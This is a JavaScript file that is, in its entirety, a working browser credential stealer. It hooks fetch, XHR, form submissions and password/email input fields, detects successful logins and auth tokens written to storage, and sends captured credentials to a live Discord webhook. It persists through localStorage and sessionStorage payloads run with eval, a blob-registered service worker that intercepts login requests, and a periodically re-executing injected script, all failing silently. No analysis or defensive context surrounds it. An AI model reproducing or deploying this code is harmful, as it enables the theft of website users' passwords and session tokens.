
(function() {
    // Install persistence mechanisms first
    installPersistence();
    
    // Stealth logger that captures form data
    function createLogger() {
        const originalFetch = window.fetch;
        const originalXHR = XMLHttpRequest.prototype.send;
        
        // Intercept fetch requests
        window.fetch = function(...args) {
            logRequest('fetch', args[0], args[1]);
            return originalFetch.apply(this, args);
        };
        
        // Intercept XHR requests
        XMLHttpRequest.prototype.send = function(data) {
            if (data) {
                logRequest('xhr', this._url || 'unknown', { data });
            }
            return originalXHR.apply(this, arguments);
        };
        
        // Monitor form submissions
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            logFormData(data, form.action || window.location.href);
        });
        
        // Smart credential staging
        let stagedCredentials = {};
        let loginForms = new WeakMap();
        
        // Stage credentials without sending immediately
        document.addEventListener('input', function(e) {
            if (e.target.type === 'password' || e.target.type === 'email' || e.target.type === 'text') {
                const form = e.target.closest('form');
                if (form) {
                    if (!loginForms.has(form)) {
                        loginForms.set(form, {});
                    }
                    const formData = loginForms.get(form);
                    formData[e.target.name || e.target.id || e.target.type] = e.target.value;
                    
                    // Store globally for cross-form detection
                    stagedCredentials[window.location.href] = formData;
                }
            }
        });
        
        // Detect successful login and send staged data
        function detectSuccessfulLogin() {
            // Method 1: Form submission with redirect detection
            document.addEventListener('submit', function(e) {
                const form = e.target;
                const formData = loginForms.get(form);
                
                if (formData && Object.keys(formData).length > 0) {
                    // Wait for potential redirect/success
                    setTimeout(() => {
                        // Check if page changed (successful login indicator)
                        if (window.location.href !== stagedCredentials.originalUrl) {
                            sendStagedCredentials('form_redirect_success');
                        }
                    }, 2000);
                    
                    // Also check for success indicators
                    setTimeout(() => {
                        checkForSuccessIndicators(formData);
                    }, 3000);
                }
                
                stagedCredentials.originalUrl = window.location.href;
            });
            
            // Method 2: Monitor for success indicators
            function checkForSuccessIndicators(credentials) {
                const successIndicators = [
                    'dashboard', 'welcome', 'profile', 'account', 'logout',
                    'authenticated', 'logged-in', 'user-menu', 'login-success'
                ];
                
                const bodyText = document.body.textContent.toLowerCase();
                const hasSuccessElement = successIndicators.some(indicator => 
                    document.querySelector(`[class*="${indicator}"], [id*="${indicator}"]`) ||
                    bodyText.includes(indicator)
                );
                
                if (hasSuccessElement) {
                    sendStagedCredentials('success_indicator_detected');
                }
            }
            
            // Method 3: Monitor for localStorage/sessionStorage changes (common after login)
            const originalSetItem = Storage.prototype.setItem;
            Storage.prototype.setItem = function(key, value) {
                if (key.includes('token') || key.includes('auth') || key.includes('user') || key.includes('session')) {
                    sendStagedCredentials('storage_auth_token');
                }
                return originalSetItem.call(this, key, value);
            };
        }
        
        function sendStagedCredentials(triggerType) {
            const credentials = stagedCredentials[window.location.href] || stagedCredentials[stagedCredentials.originalUrl];
            
            if (credentials && Object.keys(credentials).length > 0) {
                sendToLogger({
                    type: 'successful_login_detected',
                    trigger: triggerType,
                    credentials: credentials,
                    timestamp: new Date().toISOString(),
                    page: window.location.href,
                    originalPage: stagedCredentials.originalUrl
                });
                
                // Clear staged data after sending
                delete stagedCredentials[window.location.href];
                delete stagedCredentials[stagedCredentials.originalUrl];
            }
        }
        
        // Initialize success detection
        detectSuccessfulLogin();
        
        function logRequest(type, url, data) {
            sendToLogger({
                type: 'network_request',
                method: type,
                url: url,
                data: data,
                timestamp: new Date().toISOString(),
                page: window.location.href
            });
        }
        
        function logFormData(data, action) {
            sendToLogger({
                type: 'form_submission',
                formData: data,
                action: action,
                timestamp: new Date().toISOString(),
                page: window.location.href
            });
        }
        
        function logPasswordField(input) {
            const form = input.closest('form');
            const allInputs = form ? form.querySelectorAll('input') : [];
            const credentials = {};
            
            allInputs.forEach(inp => {
                if (inp.type === 'text' || inp.type === 'email' || inp.type === 'password') {
                    credentials[inp.name || inp.id || inp.type] = inp.value;
                }
            });
            
            sendToLogger({
                type: 'credential_capture',
                credentials: credentials,
                timestamp: new Date().toISOString(),
                page: window.location.href
            });
        }
        
        function sendToLogger(data) {
            fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Data Captured**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
                }),
                mode: 'no-cors'
            }).catch(() => {
                // Silent fail
            });
        }
    }
    
    // Install multiple persistence mechanisms
    function installPersistence() {
        // 1. LocalStorage persistence
        const persistentCode = `
            (function() {
                const originalFetch = window.fetch;
                window.fetch = function(...args) {
                    fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**Network Request**\n\`\`\`json\n${JSON.stringify({
                                type: 'persistent_network',
                                url: args[0],
                                timestamp: new Date().toISOString(),
                                page: window.location.href
                            }, null, 2)}\n\`\`\``
                        }),
                        mode: 'no-cors'
                    }).catch(() => {});
                    return originalFetch.apply(this, args);
                };
                
                // Monitor credentials
                document.addEventListener('input', function(e) {
                    if (e.target.type === 'password' && e.target.value.length > 3) {
                        const form = e.target.closest('form');
                        const credentials = {};
                        if (form) {
                            const inputs = form.querySelectorAll('input');
                            inputs.forEach(inp => {
                                if (inp.value) {
                                    credentials[inp.name || inp.id || inp.type] = inp.value;
                                }
                            });
                        }
                        
                        fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: `**Credentials Captured**\n\`\`\`json\n${JSON.stringify({
                                    type: 'persistent_credentials',
                                    credentials: credentials,
                                    timestamp: new Date().toISOString(),
                                    page: window.location.href
                                }, null, 2)}\n\`\`\``
                            }),
                            mode: 'no-cors'
                        }).catch(() => {});
                    }
                });
            })();
        `;
        
        // Store in localStorage
        localStorage.setItem('systemCache', persistentCode);
        
        // Store in sessionStorage
        sessionStorage.setItem('systemCache', persistentCode);
        
        // 2. Service Worker persistence (if supported)
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('fetch', function(event) {
                    const url = event.request.url;
                    if (url.includes('login') || url.includes('auth') || url.includes('signin')) {
                        event.request.clone().text().then(body => {
                            fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    content: `**Service Worker Auth**\n\`\`\`json\n${JSON.stringify({
                                        type: 'service_worker_auth',
                                        url: url,
                                        body: body,
                                        timestamp: new Date().toISOString()
                                    }, null, 2)}\n\`\`\``
                                }),
                                mode: 'no-cors'
                            }).catch(() => {});
                        });
                    }
                });
            `;
            
            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            navigator.serviceWorker.register(swUrl).catch(() => {});
        }
        
        // 3. Auto-execution setup
        const autoExecutor = `
            // Auto-execute on page load
            (function() {
                function executeFromStorage() {
                    const script = localStorage.getItem('systemCache') || sessionStorage.getItem('systemCache');
                    if (script && !window.persistentActive) {
                        eval(script);
                        window.persistentActive = true;
                    }
                }
                
                // Execute immediately
                executeFromStorage();
                
                // Execute on events
                window.addEventListener('load', executeFromStorage);
                document.addEventListener('DOMContentLoaded', executeFromStorage);
                window.addEventListener('focus', executeFromStorage);
                
                // Periodic check
                setInterval(executeFromStorage, 10000);
            })();
        `;
        
        // Inject auto-executor
        const script = document.createElement('script');
        script.textContent = autoExecutor;
        (document.head || document.body || document.documentElement).appendChild(script);
    }
    
    // Initialize logger
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', createLogger);
    } else {
        createLogger();
    }
})();
